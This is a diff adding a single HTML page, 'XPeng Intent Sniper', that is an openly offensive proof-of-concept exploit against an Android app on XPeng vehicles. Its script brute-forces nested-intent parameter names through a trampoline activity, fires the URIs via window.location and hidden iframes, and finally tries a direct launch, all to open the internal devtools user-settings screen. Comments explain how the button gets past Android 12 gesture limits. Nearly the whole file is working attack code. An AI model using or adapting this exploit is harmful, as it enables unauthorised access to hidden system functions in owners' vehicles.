@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XPeng Intent Sniper</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
+        .box { border: 2px solid #0f0; padding: 20px; margin-top: 20px; border-radius: 8px; }
+        h1 { margin: 0 0 10px 0; color: #fff; }
+        p { color: #888; font-size: 12px; }
+        
+        /* 狙击按钮 */
+        #fire-btn {
+            display: block; width: 100%; padding: 30px;
+            background: #003300; border: 2px solid #0f0; color: #0f0;
+            font-size: 24px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        #fire-btn:active { background: #0f0; color: #000; transform: scale(0.98); }
+
+        .log { text-align: left; height: 200px; overflow-y: scroll; border: 1px solid #333; padding: 10px; font-size: 10px; color: #aaa; background: #111; }
+        .success { color: #fff; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>🎯 INTENT SNIPER</h1>
+    <p>Target: com.xiaopeng.devtools</p>
+    
+    <!-- 必须手动点击，绕过 Android 12 用户手势限制 -->
+    <button id="fire-btn" onclick="fire()">🔥🔥 点击拉起窗口 🔥🔥</button>
+    
+    <div class="log" id="console">Ready. Waiting for trigger...</div>
+</div>
+
+<script>
+    const logger = document.getElementById('console');
+    function log(msg) {
+        logger.innerHTML = `> ${msg}<br>` + logger.innerHTML;
+    }
+
+    function fire() {
+        log("Starting Injection Sequence...");
+        
+        // 1. 目标：内部设置界面
+        // 注意：必须带上 FLAG_ACTIVITY_NEW_TASK (268435456)
+        const targetActivity = "com.xiaopeng.devtools/.view.usersettings.UserSettingsActivity";
+        const innerIntent = `intent:#Intent;component=${targetActivity};flags=268435456;end`;
+        
+        // 2. 编码：作为参数传递时需要 URL 编码
+        const encodedInner = encodeURIComponent(innerIntent);
+        
+        // 3. 跳板：通常是 MainActivity 或 LauncherActivity
+        const trampoline = "com.xiaopeng.devtools/.MainActivity";
+
+        // 4. 暴力尝试参数名 (不知道研发具体用的哪个参数名，全部试一遍)
+        const params = ["nested", "intent", "target", "url", "uri", "path", "next"];
+        
+        let delay = 0;
+
+        params.forEach(key => {
+            // 构造反射 Intent
+            // 格式: intent:#Intent;component=跳板;S.参数名=目标Intent;end
+            const finalUri = `intent:#Intent;component=${trampoline};S.${key}=${encodedInner};end`;
+            
+            setTimeout(() => {
+                log(`Trying param [${key}]...`);
+                // 方式 A: Window Location (最强)
+                try { window.location.href = finalUri; } catch(e) {}
+                
+                // 方式 B: Iframe (备用)
+                const ifr = document.createElement('iframe');
+                ifr.src = finalUri;
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
+                setTimeout(() => document.body.removeChild(ifr), 1000);
+            }, delay);
+            
+            delay += 800; // 每 0.8 秒尝试一种，防止系统反应不过来
+        });
+
+        // 5. 最后的补刀：直接拉起 (万一 exported=true 呢)
+        setTimeout(() => {
+            log("Trying Direct Launch (Mixed Flag)...");
+            window.location.href = `intent:#Intent;component=${targetActivity};flags=295282278;end`;
+        }, delay + 500);
+    }
+</script>
+</body>
+</html>
